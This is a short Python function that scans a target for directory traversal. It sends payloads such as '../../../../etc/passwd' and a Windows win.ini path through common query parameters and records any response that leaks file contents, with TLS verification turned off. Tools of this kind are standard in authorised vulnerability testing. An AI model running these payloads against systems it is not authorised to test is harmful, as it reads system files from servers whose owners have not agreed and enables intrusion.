import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def scan_directory_traversal(target):
    results = []
    payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
    for scheme in ["http", "https"]:
        for param in ["file", "path", "page"]:
            for payload in payloads:
                url = f"{scheme}://{target}?{param}={payload}"
                try:
                    res = requests.get(url, timeout=3, verify=False)
                    if "root:x:" in res.text or "[extensions]" in res.text:
                        results.append({
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "evidence": res.text[:200]
                        })
                except Exception:
                    continue
    return {
        "vulnerable": bool(results),
        "details": results
    }